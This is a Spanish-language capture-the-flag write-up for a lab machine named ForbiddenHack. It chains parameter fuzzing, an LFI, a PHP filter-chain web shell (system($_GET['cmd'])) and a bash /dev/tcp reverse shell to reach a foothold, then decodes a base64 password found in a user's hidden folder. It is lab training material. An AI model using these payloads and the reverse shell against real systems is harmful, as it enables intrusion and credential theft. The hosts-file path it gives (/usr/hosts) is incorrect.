# ForbiddenHack - Writeup

## Resumen
En esta máquina haremos fuzzing a parámetros para poder aplicar un **LFI** y ejecutar código mediante un **PHP Wrapper** 

## Paso N1: Reconocimiento
Empezaremos escaneando los puertos TCP abiertos en la máquina con sus respectivos servicios y versiones
```
nmap 172.17.0.2 -sS -sVC -n -Pn -p- --open --min-rate 5000 -oG open_ports
```
<img width="663" height="312" alt="image" src="https://github.com/user-attachments/assets/b5b04de5-719e-490f-aab8-0fb0876c7567" />

Veremos que únicamente está abierto el puerto 80, por lo que tendremos que examinar la página.

## Paso N2: Configurando hosts
Al entrar a la página, veremos que es la página default de de Apache2 y veremos esta línea `/var/www/bypass403.pw`
<img width="802" height="155" alt="image" src="https://github.com/user-attachments/assets/002f3ce4-17c6-4c81-9e52-738df70807c4" />

Lo que nos dice que internamente el servidor tiene la ruta `bypass403.pw`, por lo que reconfiguraremos los hosts usando `sudo nano /usr/hosts` `172.17.0.2 bypass403.pw`
<img width="655" height="218" alt="image" src="https://github.com/user-attachments/assets/b3185cd4-8a3f-4d01-a785-857e12adaf65" />

Una vez dentro, veremos que no tenemos acceso a la página.

## Paso N3: Fuzzeando parámetros 
Como la idea es bypassear el código 500 de la página web, tendremos que buscar algún parametro vulnerable para poder realizar un **LFI**, por lo que usamos `wfuzz` agregando `-H "Referer: http://bypass403.pw"`, esto ya que el servidor permite acceso únicamente si el `Referer` coincide con su propio dominio.
```
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hl 38 -u http://bypass403.pw?FUZZ=test -H "Referer: http://bypass403.pw"
```
<img width="586" height="174" alt="image" src="https://github.com/user-attachments/assets/ec093833-dcf3-4e2b-98cc-2647690c73bf" />

Encontramos que el parámetro vulnerable es `pages`, por lo que ahora podremos pasarlo a **Burpsuite** e interceptar la petición.

## Paso N4: Interceptando la petición
Entraremos a **Burpsuite** y mandamos la petición al **Repeater**, agregando nuevamente la cabecera `Referer: http://bypass403.pw` y probando el parámetro `pages`
<img width="1038" height="410" alt="image" src="https://github.com/user-attachments/assets/7fa76724-4431-4055-888f-04b3a16e192f" />

Vemos que funciona correctamente. La idea a partir de acá es lograr inyectar código php, y la forma de hacerlo es usando un **PHP Wrapper**, el cual es una forma de ejecutar código php mediante la url. Para generar el código usaremos una herramienta llamada [`php_filter_chain_generator`](https://github.com/synacktiv/php_filter_chain_generator). Copiaremos el directorio el nuestra máquina con git clone y le subiremos el código que queremos queremos ejecutar
```
git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```
Esto nos generará un código gigante el cual tendremos que poner en el parámetro y luego deberíamos de poder ejecutar comando usando `&cmd=`
<img width="1038" height="414" alt="image" src="https://github.com/user-attachments/assets/836561a6-5d37-42eb-b137-22c3d4234081" />

Por lo que ya pudimos realizar un **RCE**

## Paso N5: Generando reverse shell
Una vez podamos ejecutar código tenemos que ejecutar una reverse shell escuchando en el puerto 443 `nc -lvnp 443` con:
```
bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
```
Pero de primeras no nos dejará, tenemos que codearlo a url, por lo que si dejamos el texto remarcado y se presiona Ctrl+U en burpsuite se codeará automáticamente y habremos logrado acceder al sistema.
<img width="1036" height="413" alt="image" src="https://github.com/user-attachments/assets/eef5be4f-cd29-49f2-956c-812bbff84b56" />
<img width="677" height="158" alt="image" src="https://github.com/user-attachments/assets/81958457-3cf7-4716-a720-b26cc4fee90c" />

## Paso N6: Accediendo a usuarios
Empezaremos estabilizando la shell con
```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```
Luego, en el directorio `/home` veremos que hay un usuario llamado `bambi` y dentro de su directorio habra un directorio oculto llamado `.secret` el cual tiene el siguiente contenido
<img width="641" height="111" alt="image" src="https://github.com/user-attachments/assets/569041ee-c971-4d04-b8ee-caaef7b4026e" />
```
bambi:c3VwZXJzZWNyZXRwYXNzd29yZDEyMw
```
al deshashearlo tenemos que la contraseña para bambi es `supersecretpassword123` por lo que ya podremos acceder


